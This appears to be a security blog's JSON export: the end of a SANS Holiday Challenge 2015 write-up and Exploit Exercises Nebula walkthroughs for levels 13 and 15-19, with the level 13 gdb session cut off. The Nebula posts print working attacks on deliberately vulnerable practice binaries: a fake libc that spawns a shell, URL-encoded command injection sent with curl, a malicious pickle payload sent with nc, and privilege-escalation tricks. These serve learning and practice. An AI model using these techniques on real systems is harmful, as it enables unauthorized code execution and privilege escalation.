are a precious and beautiful Who, my dear. Please use your skills wisely and to help and support your fellow Who, especially during the holidays. I sincerely wish you a holiday season full of kindness and warmth, --The Grinch  It is also worth noting that we were able to collect Cindy\u0026rsquo;s password from this pcap:\n User: c Password: AllYourPresentsAreBelongToMe  104.196.40.60 is the IP she connects to\u0026hellip;\nMaybe next time!\nImage Evidence I collected up each of the staticky images from the SuperGnomes and used the tool Stegsolve.jar to xor the images and reveal the final image:\n9) Based on evidence you recover from the SuperGnomes’ packet capture ZIP files and any staticky images you find, what is the nefarious plot of ATNAS Corporation?\nAfter reviewing all of the evidence in the packet captures and images, we discover the nefarious plot of the ATNAS corp. Cindy Lou Who was traumatized by the witnessing the actions of the Grinch on that Christmas night. She has grown to hate Christmas and believes she can improve on the Grinch\u0026rsquo;s plan. Her plot is to distribute gnomes to as many homes as possible by Dec. 24.\nThe gnomes purpose is to gather information about the households, specifically the belongings in the homes. This information gathering includes taking still snapshots of the rooms they are placed in and sniffing network traffic for specific terms (outlined in sniffer_hit_list.txt). All of this info is sent to the associated SuperGnomes where it will be reviewed by ATNAS. ATNAS will use this information to organize and deploy burglars, dressed as Santa, to the homes to steal specific presents. These items will be sold and the profits will be split 50/50 between the ATNAS corp and the burglars.\nThe summary of the plan is revealed very eloquently by Cindy:\n \u0026quot;Oh, and I've heard that many of you are asking where the name ATNAS comes from. Why, it's reverse SANTA, of course. Instead of bringing presents on Christmas, we'll be stealing them.\u0026quot;  10) Who is the villain behind the nefarious plot.\nAs we can see in the email and photo evidence, Cindy Lou Who, President and CEO of ATNAS Corporation, is the mastermind behind the nefarious plot.\nConclusion What a great challenge and amazing learning experience. I would like to blame Netflix and \u0026ldquo;Making a Murderer\u0026rdquo; for sabotaging and preventing me from solving SG-05 before the submission deadline. :)\nIn all seriousness, I would like to thank all the folks over at SANS and CounterHack for their amazing work! I cannot wait to see what they have in store for next year!\nHad to include a final picture with one of my favorite people and birthday-sharer, Ed Skoudis.\nThanks!\nMike\n",
    "ref": "/blog/sans-holiday-challenge-2015-writeup/"
  },{
    "title": "Exploit Exercises Nebula Level15",
    "date": "",
    "description": "",
    "body": "The About section for Level15 contains the following instructions:\n\u0026ldquo;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.\nYou may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.\nClean up after yourself :)\u0026rdquo;\nLet\u0026rsquo;s follow the instructions and run strace:\n level15@nebula:/home/flag15$ strace ./flag15 execve(\u0026quot;./flag15\u0026quot;, [\u0026quot;./flag15\u0026quot;], [/* 20 vars */]) = 0 brk(0) = 0x9bad000 access(\u0026quot;/etc/ld.so.nohwcap\u0026quot;, F_OK) = -1 ENOENT (No such file or directory) mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78da000 access(\u0026quot;/etc/ld.so.preload\u0026quot;, R_OK) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/tls/i686/sse2/cmov\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/tls/i686/sse2\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/tls/i686/cmov\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/tls/i686/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/tls/i686\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/tls/sse2/cmov\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/tls/sse2/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/tls/sse2\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/tls/cmov/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/tls/cmov\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/tls/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/tls\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/i686/sse2/cmov\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/i686/sse2/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/i686/sse2\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/i686/cmov/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/i686/cmov\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/i686/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/i686\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/sse2/cmov/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/sse2/cmov\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/sse2/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/sse2\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/cmov/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15/cmov\u0026quot;, 0xbf946604) = -1 ENOENT (No such file or directory) open(\u0026quot;/var/tmp/flag15/libc.so.6\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) stat64(\u0026quot;/var/tmp/flag15\u0026quot;, {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0 open(\u0026quot;/etc/ld.so.cache\u0026quot;, O_RDONLY) = 3 fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0 mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb78d1000 close(3) = 0 access(\u0026quot;/etc/ld.so.nohwcap\u0026quot;, F_OK) = -1 ENOENT (No such file or directory) open(\u0026quot;/lib/i386-linux-gnu/libc.so.6\u0026quot;, O_RDONLY) = 3 read(3, \u0026quot;\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0p\\222\\1\\0004\\0\\0\\0\u0026quot;..., 512) = 512 fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0 mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x829000 mmap2(0x99f000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x99f000 mmap2(0x9a2000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x9a2000 close(3) = 0 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78d0000 set_thread_area({entry_number:-1 -\u0026gt; 6, base_addr:0xb78d08d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 mprotect(0x99f000, 8192, PROT_READ) = 0 mprotect(0x8049000, 4096, PROT_READ) = 0 mprotect(0x31f000, 4096, PROT_READ) = 0 munmap(0xb78d1000, 33815) = 0 fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78d9000 write(1, \u0026quot;strace it!\\n\u0026quot;, 11strace it! ) = 11 exit_group(11) = ?  Strange, it is trying (and erroring) when attempting to open a number of items in \u0026lsquo;/var/tmp/flag15/\u0026rsquo;.\nI took a quick look at the directory to check if it was a permissions issue:\n level15@nebula:/var/tmp/flag15$ ls -al total 0 drwxrwxr-x 2 level15 level15 3 2012-10-31 01:38 . drwxrwxrwt 1 root root 40 2016-02-19 23:37 ..  Nope, nothing is in that directory. Time to run a quick objdump to see if we can glean some additional details:\n level15@nebula:/home/flag15$ objdump -p flag15 flag15: file format elf32-i386 Program Header: PHDR off 0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2 filesz 0x00000120 memsz 0x00000120 flags r-x INTERP off 0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0 filesz 0x00000013 memsz 0x00000013 flags r-- LOAD off 0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12 filesz 0x000005d4 memsz 0x000005d4 flags r-x LOAD off 0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12 filesz 0x00000108 memsz 0x00000110 flags rw- DYNAMIC off 0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2 filesz 0x000000d0 memsz 0x000000d0 flags rw- NOTE off 0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2 filesz 0x00000044 memsz 0x00000044 flags r-- EH_FRAME off 0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2 filesz 0x00000034 memsz 0x00000034 flags r-- STACK off 0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2 filesz 0x00000000 memsz 0x00000000 flags rw- RELRO off 0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0 filesz 0x000000f4 memsz 0x000000f4 flags r-- Dynamic Section: NEEDED libc.so.6 RPATH /var/tmp/flag15 INIT 0x080482c0 FINI 0x080484ac GNU_HASH 0x080481ac STRTAB 0x0804821c SYMTAB 0x080481cc STRSZ 0x0000005a SYMENT 0x00000010 DEBUG 0x00000000 PLTGOT 0x08049ff4 PLTRELSZ 0x00000018 PLTREL 0x00000011 JMPREL 0x080482a8 REL 0x080482a0 RELSZ 0x00000008 RELENT 0x00000008 VERNEED 0x08048280 VERNEEDNUM 0x00000001 VERSYM 0x08048276 Version References: required from libc.so.6: 0x0d696910 0x00 02 GLIBC_2.0  This line piqued my interest, it may explain the calls to \u0026lsquo;/var/tmp/flag15/\u0026rsquo;.\n RPATH /var/tmp/flag15  I am jumping ahead a bit here after numerous attempts and all the different paths I went down. I did not want to make this post 30 pages long :).\nMy goal was to use the calls to \u0026ldquo;/var/tmp/flag15/libc.so.6\u0026rdquo; and replace it with my code. This is not as simple as it sounds and I spent a lot of time troubleshooting all the various errors that occurred.\nHere are the contents of my \u0026ldquo;dummy_libc.c\u0026rdquo;:\n level15@nebula:/var/tmp/flag15$ cat dummy_libc.c #include\u0026lt;stdio.h\u0026gt; int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { system(\u0026quot;/bin/sh\u0026quot;); return 0; }  One of the breakthroughs I experienced was when I was consistently seeing an error thrown specifying no version information available. Thank goodness for stackoverflow!\n level15@nebula:/var/tmp/flag15$ cat version.ld GLIBC_2.0 { };  Time to compile:\n level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic dummy_libc.c -o libc.so.6  Let\u0026rsquo;s run flag15 and pray..\n level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 sh-4.2$ id uid=1016(level15) gid=1016(level15) euid=984(flag15) groups=984(flag15),1016(level15) sh-4.2$ getflag You have successfully executed getflag on a target account  Wow, I was overjoyed when I finally saw that shell prompt appear. What an amazing learning experience that level was!\nAdmittedly, this level took me a long time and required a significant amount of additional research. I knew \u0026ldquo;what\u0026rdquo; I needed to do, just not \u0026ldquo;how\u0026rdquo; to do it.\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level15/"
  },{
    "title": "Exploit Exercises Nebula Level16",
    "date": "",
    "description": "",
    "body": "For Level16, we are told that a perl script is running on port 1616.\nThe source code for that script is provided:\n #!/usr/bin/env perl use CGI qw{param}; print \u0026quot;Content-type: text/html\\n\\n\u0026quot;; sub login { $username = $_[0]; $password = $_[1]; $username =~ tr/a-z/A-Z/; # conver to uppercase $username =~ s/\\s.*//; # strip everything after a space @output = `egrep \u0026quot;^$username\u0026quot; /home/flag16/userdb.txt 2\u0026gt;\u0026amp;1`; foreach $line (@output) { ($usr, $pw) = split(/:/, $line); if($pw =~ $password) { return 1; } } return 0; } sub htmlz { print(\u0026quot;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Login resuls\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026quot;); if($_[0] == 1) { print(\u0026quot;Your login was accepted\u0026lt;br/\u0026gt;\u0026quot;); } else { print(\u0026quot;Your login failed\u0026lt;br/\u0026gt;\u0026quot;); } print(\u0026quot;Would you like a cookie?\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\\n\u0026quot;); } htmlz(login(param(\u0026quot;username\u0026quot;), param(\u0026quot;password\u0026quot;)));  As my buddy Kristian always says, \u0026ldquo;You can smell the vulnerabilities.\u0026rdquo; Just looking at this code, we can detect some command injection is possible.\nLet\u0026rsquo;s work through the filtering that is being performed:\n $username =~ tr/a-z/A-Z/; # convert to uppercase $username =~ s/\\s.*//; # strip everything after a space  The comments in the code assist with the regex. Let\u0026rsquo;s bypass the filter:\n level16@nebula:/tmp$ cat FOO #!/bin/bash /usr/bin/id \u0026gt; /tmp/bar /bin/getflag \u0026gt;\u0026gt; /tmp/bar level16@nebula:/tmp$ chmod +x !$ chmod +x FOO  Naming the script FOO will satisfy the uppercase requirement as long as we can call the script using a wildcard, like \u0026lsquo;/*/FOO\u0026rsquo;.\nLet\u0026rsquo;s urlencode that and curl the page:\n $ urlencode '`/*/FOO`' %60%2f%2a%2f%46%4f%4f%60 $ curl \u0026quot;http://192.168.98.138:1616/index.cgi?username=%60%2f%2a%2f%46%4f%4f%60\u0026amp;password=foo\u0026quot; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Login resuls\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;Your login failed\u0026lt;br/\u0026gt;Would you like a cookie?\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;  We injected the username parameter. Let\u0026rsquo;s see if it worked:\n level16@nebula:/tmp$ cat bar uid=983(flag16) gid=983(flag16) groups=983(flag16) You have successfully executed getflag on a target account  Success!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level16/"
  },{
    "title": "Exploit Exercises Nebula Level17",
    "date": "",
    "description": "",
    "body": "Level17 dictates, \u0026ldquo;There is a python script listening on port 10007 that contains a vulnerability.\u0026rdquo;\nPython! Nice. The nebula war game is using a variety of languages, which is fantastic. We are provided with the following source code:\n #!/usr/bin/python import os import pickle import time import socket import signal signal.signal(signal.SIGCHLD, signal.SIG_IGN) def server(skt): line = skt.recv(1024) obj = pickle.loads(line) for i in obj: clnt.send(\u0026quot;why did you send me \u0026quot; + i + \u0026quot;?\\n\u0026quot;) skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) skt.bind(('0.0.0.0', 10007)) skt.listen(10) while True: clnt, addr = skt.accept() if(os.fork() == 0): clnt.send(\u0026quot;Accepted connection from %s:%d\u0026quot; % (addr[0], addr[1])) server(clnt) exit(1)  I won\u0026rsquo;t spoil it, but I learned about pickle over at pythonchallenge.com. Do some additional research if you are not familiar with it.\nThe majority of the information on pickle will present you with this warning:\n Warning The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.  Never trust the user :)\nLet\u0026rsquo;s craft some malicious data:\n level17@nebula:~$ cat foo cos system (S'getflag \u0026gt; /home/flag17/output' tR.  This data, when deserialized, instructs the system to run \u0026lsquo;getflag \u0026gt; /home/flag17/output\u0026rsquo;. Let\u0026rsquo;s direct it at the listener using netcat.\n level17@nebula:~$ nc localhost 10007 \u0026lt; foo Accepted connection from 127.0.0.1:44614^C level17@nebula:~$ cat /home/flag17/output You have successfully executed getflag on a target account  Woo, on to the next level!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level17/"
  },{
    "title": "Exploit Exercises Nebula Level18",
    "date": "",
    "description": "",
    "body": "Level18 provides us with this large snippet of code:\n #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;getopt.h\u0026gt; struct { FILE *debugfile; int verbose; int loggedin; } globals; #define dprintf(...) if(globals.debugfile) \\ fprintf(globals.debugfile, __VA_ARGS__) #define dvprintf(num, ...) if(globals.debugfile \u0026amp;\u0026amp; globals.verbose \u0026gt;= num) \\ fprintf(globals.debugfile, __VA_ARGS__) #define PWFILE \u0026quot;/home/flag18/password\u0026quot; void login(char *pw) { FILE *fp; fp = fopen(PWFILE, \u0026quot;r\u0026quot;); if(fp) { char file[64]; if(fgets(file, sizeof(file) - 1, fp) == NULL) { dprintf(\u0026quot;Unable to read password file %s\\n\u0026quot;, PWFILE); return; } fclose(fp); if(strcmp(pw, file) != 0) return; } dprintf(\u0026quot;logged in successfully (with%s password file)\\n\u0026quot;, fp == NULL ? \u0026quot;out\u0026quot; : \u0026quot;\u0026quot;); globals.loggedin = 1; } void notsupported(char *what) { char *buffer = NULL; asprintf(\u0026amp;buffer, \u0026quot;--\u0026gt; [%s] is unsupported at this current time.\\n\u0026quot;, what); dprintf(what); free(buffer); } void setuser(char *user) { char msg[128]; sprintf(msg, \u0026quot;unable to set user to '%s' -- not supported.\\n\u0026quot;, user); printf(\u0026quot;%s\\n\u0026quot;, msg); } int main(int argc, char **argv, char **envp) { char c; while((c = getopt(argc, argv, \u0026quot;d:v\u0026quot;)) != -1) { switch(c) { case 'd': globals.debugfile = fopen(optarg, \u0026quot;w+\u0026quot;); if(globals.debugfile == NULL) err(1, \u0026quot;Unable to open %s\u0026quot;, optarg); setvbuf(globals.debugfile, NULL, _IONBF, 0); break; case 'v': globals.verbose++; break; } } dprintf(\u0026quot;Starting up. Verbose level = %d\\n\u0026quot;, globals.verbose); setresgid(getegid(), getegid(), getegid()); setresuid(geteuid(), geteuid(), geteuid()); while(1) { char line[256]; char *p, *q; q = fgets(line, sizeof(line)-1, stdin); if(q == NULL) break; p = strchr(line, '\\n'); if(p) *p = 0; p = strchr(line, '\\r'); if(p) *p = 0; dvprintf(2, \u0026quot;got [%s] as input\\n\u0026quot;, line); if(strncmp(line, \u0026quot;login\u0026quot;, 5) == 0) { dvprintf(3, \u0026quot;attempting to login\\n\u0026quot;); login(line + 6); } else if(strncmp(line, \u0026quot;logout\u0026quot;, 6) == 0) { globals.loggedin = 0; } else if(strncmp(line, \u0026quot;shell\u0026quot;, 5) == 0) { dvprintf(3, \u0026quot;attempting to start shell\\n\u0026quot;); if(globals.loggedin) { execve(\u0026quot;/bin/sh\u0026quot;, argv, envp); err(1, \u0026quot;unable to execve\u0026quot;); } dprintf(\u0026quot;Permission denied\\n\u0026quot;); } else if(strncmp(line, \u0026quot;logout\u0026quot;, 4) == 0) { globals.loggedin = 0; } else if(strncmp(line, \u0026quot;closelog\u0026quot;, 8) == 0) { if(globals.debugfile) fclose(globals.debugfile); globals.debugfile = NULL; } else if(strncmp(line, \u0026quot;site exec\u0026quot;, 9) == 0) { notsupported(line + 10); } else if(strncmp(line, \u0026quot;setuser\u0026quot;, 7) == 0) { setuser(line + 8); } } return 0; }  It also provides us with these directions:\n\u0026ldquo;Analyze the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.\u0026rdquo;\nI will start off by admitting that I definitely took the easy way of solving this level. Maybe after more practice I will come back and attempt the intermediate and difficult/unreliable ways.\nAfter taking the time to dissect the code, I noticed an interesting detail: if the program cannot read the password file, it will log us in anyway. Let\u0026rsquo;s look at that file:\n level18@nebula:/home/flag18$ ls -l total 13 -rwsr-x--- 1 flag18 level18 12216 2011-11-20 21:22 flag18 -rw------- 1 flag18 flag18 37 2011-11-20 21:22 password  No simple ways to move or modify it with those permissions set, so it must be something else. It reminded me of an interesting error I encountered with one of my logging servers.\n \u0026quot;Too many open files(24)\u0026quot;  If we can hit that limit before the program attempts to access the password file, it won\u0026rsquo;t be able to allocate a file descriptor. Let\u0026rsquo;s check what the limit is with ulimit:\n level18@nebula:~$ ulimit -n 1024  1024 is the open file limit, but remember that we need to spare 3 to stdin, stdout and stderr. You can modify the limit with ulimit -n 4, but it did not work for me. I wrote a small loop instead:\n level18@nebula:~$ python -c 'print(\u0026quot;login foo\\n\u0026quot;*1021)' \u0026gt; /home/level18/foo level18@nebula:~$ python -c 'print(\u0026quot;closelog\u0026quot;)' \u0026gt;\u0026gt; foo level18@nebula:~$ python -c 'print(\u0026quot;shell\u0026quot;)' \u0026gt;\u0026gt; foo  With all the input generated, I just need to pipe it to the flag18 program.\n level18@nebula:/home/flag18$ cat /home/level18/foo | ./flag18 -d /dev/tty Starting up. Verbose level = 0 logged in successfully (without password file) ./flag18: -d: invalid option  Hm, that error is being thrown because sh does not have a -d flag. Adding a bogus init-file did the trick:\n level18@nebula:/home/flag18$ cat /home/level18/foo | ./flag18 --init-file /bogus -d /dev/tty ./flag18: invalid option -- '-' ./flag18: invalid option -- 'i' ./flag18: invalid option -- 'n' ./flag18: invalid option -- 'i' ./flag18: invalid option -- 't' ./flag18: invalid option -- '-' ./flag18: invalid option -- 'f' ./flag18: invalid option -- 'i' ./flag18: invalid option -- 'l' ./flag18: invalid option -- 'e' Starting up. Verbose level = 0 logged in successfully (without password file) id uid=981(flag18) gid=1019(level18) groups=981(flag18),1019(level18) getflag You have successfully executed getflag on a target account  It worked, on to the final level!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level18/"
  },{
    "title": "Exploit Exercises Nebula Level19",
    "date": "",
    "description": "",
    "body": "Level19 provides us with the following code:\n #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; int main(int argc, char **argv, char **envp) { pid_t pid; char buf[256]; struct stat statbuf; /* Get the parent's /proc entry, so we can verify its user id */ snprintf(buf, sizeof(buf)-1, \u0026quot;/proc/%d\u0026quot;, getppid()); /* stat() it */ if(stat(buf, \u0026amp;statbuf) == -1) { printf(\u0026quot;Unable to check parent process\\n\u0026quot;); exit(EXIT_FAILURE); } /* check the owner id */ if(statbuf.st_uid == 0) { /* If root started us, it is ok to start the shell */ execve(\u0026quot;/bin/sh\u0026quot;, argv, envp); err(1, \u0026quot;Unable to execve\u0026quot;); } printf(\u0026quot;You are unauthorized to run this program\\n\u0026quot;); }  And this very detailed hint:\n\u0026ldquo;There is a flaw in the below program in how it operates.\u0026rdquo;\n\u0026hellip;No way!!\nThis comment is the key /* If root started us, it is ok to start the shell */\nIn order to achieve this, we will need to force create an orphan process that would be claimed by init, which is owned by root.\nLet\u0026rsquo;s write some c code to accomplish that.\n level19@nebula:~$ cat orphanage.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main(int argc, char **argv, char **envp){ int child; child = fork(); if(child \u0026gt;= 0){ if(child == 0){ sleep(1); setresuid(geteuid(),geteuid(),geteuid()); char *args[] = {\u0026quot;/bin/sh\u0026quot;, \u0026quot;-c\u0026quot;, \u0026quot;/bin/getflag\u0026quot;, NULL}; execve(\u0026quot;/home/flag19/flag19\u0026quot;, args, envp); } } exit(0); }  Time to compile and test:\n level19@nebula:~$ gcc -o orphanage orphanage.c level19@nebula:~$ ./orphanage level19@nebula:~$ You have successfully executed getflag on a target account  Nebula completed! I want to thank the team over at Exploit Exercises for making this challenge available. I learned a ton from working through this war game, it provided me hands-on practice in a number of areas that I was looking to improve my skills.\nThanks again for reading!\nMike\n",
    "ref": "/blog/exploit-exercises-nebula-level19/"
  },{
    "title": "Exploit Exercises Nebula Level13",
    "date": "",
    "description": "",
    "body": "In Level13 we are given the following code:\n #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define FAKEUID 1000 int main(int argc, char **argv, char **envp) { int c; char token[256]; if(getuid() != FAKEUID) { printf(\u0026quot;Security failure detected. UID %d started us, we expect %d\\n\u0026quot;, getuid(), FAKEUID); printf(\u0026quot;The system administrators will be notified of this violation\\n\u0026quot;); exit(EXIT_FAILURE); } // snip, sorry :) printf(\u0026quot;your token is %s\\n\u0026quot;, token); }  In order to receive the token we need to FAKE our UID to bypass the if statement.\nNow, we could solve this a few different ways. The two that pop into mind are: 1.) Write a fake getuid() program to trick the call. 2.) Use a debugger.\nI personally decided to use a debugger to refresh some of my knowledge, but don\u0026rsquo;t let my decision dictate yours.\nSmall caveat: This blog post is not an extensive walk-through on how to use a debugger. There are tons of better resources to learn up on gdb.\nLet\u0026rsquo;s load the program into gdb, which my friend Derrick refers to as \u0026ldquo;The real man\u0026rsquo;s debugger,\u0026rdquo; and set a breakpoint at main:\n level13@nebula:/home/flag13$ gdb flag13 GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08 Copyright (C) 2011 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \u0026quot;show copying\u0026quot; and \u0026quot;show warranty\u0026quot; for details. This GDB was configured as \u0026quot;i686-linux-gnu\u0026quot;. For bug reporting instructions, please see: \u0026lt;http://bugs.launchpad.net/gdb-linaro/\u0026gt;... Reading symbols from /home/flag13/flag13...(no debugging symbols found)...done. (gdb) break main Breakpoint 1 at 0x80484c9  Looks good, let\u0026rsquo;s run it:\n (gdb) r Starting program: /home/flag13/flag13 Breakpoint 1, 0x080484c9 in main () (gdb) x/20i main 0x80484c4 \u0026lt;main\u0026gt;:\tpush %ebp 0x80484c5 \u0026lt;main+1\u0026gt;:\tmov %esp,%ebp 0x80484c7 \u0026lt;main+3\u0026gt;:\tpush %edi 0x80484c8 \u0026lt;main+4\u0026gt;:\tpush %ebx =\u0026gt; 0x80484c9 \u0026lt;main+5\u0026gt;:\tand $0xfffffff0,%esp 0x80484cc \u0026lt;main+8\u0026gt;:\tsub $0x130,%esp 0x80484d2 \u0026lt;main+14\u0026gt;:\tmov 0xc(%ebp),%eax 0x80484d5 \u0026lt;main+17\u0026gt;:\tmov %eax,0x1c(%esp) 0x80484d9 \u0026lt;main+21\u0026gt;:\tmov 0x10(%ebp),%eax 0x80484dc \u0026lt;main+24\u0026gt;:\tmov %eax,0x18(%esp) 0x80484e0 \u0026lt;main+28\u0026gt;:\tmov %gs:0x14,%eax 0x80484e6 \u0026lt;main+34\u0026gt;:\tmov %eax,0x12c(%esp) 0x80484ed \u0026lt;main+41\u0026gt;:\txor %eax,%eax 0x80484ef \u0026lt;main+43\u0026gt;:\tcall 0x80483c0 \u0026lt;getuid@plt\u0026gt; 0x80484f4 \u0026lt;main+48\u0026gt;:\tcmp $0x3e8,%eax 0x80484f9 \u0026lt;main+53\u0026gt;:\tje 0x8048531 \u0026lt;main+109\u0026gt; 0x80484fb \u0026lt;main+55\u0026gt;:\tcall 0x80483c0 \u0026lt;getuid@plt\u0026gt; 0x8048500 \u0026lt;main+60\u0026gt;:\tmov $0x80486d0,%edx 0x8048505 \u0026lt;main+65\u0026gt;:\tmovl $0x3e8,0x8(%esp) 0x804850d \u0026lt;main+73\u0026gt;:\tmov %eax,0x4(%esp)  We hit our first breakpoint and I run x/20i main to view the first 20 lines of the main() function.\nI set another break using break *main + 48 and continued stepping through:\n (gdb) break *main + 48 Breakpoint 2 at 0x80484f4 (gdb) cont Continuing.  FYI: The new breakpoint is set at 0x80484f4, which is right after the first getuid@plt call. As you can see in main(), the program compares $0x3e8 (1000 in Hex) and %eax.\n Breakpoint 2, 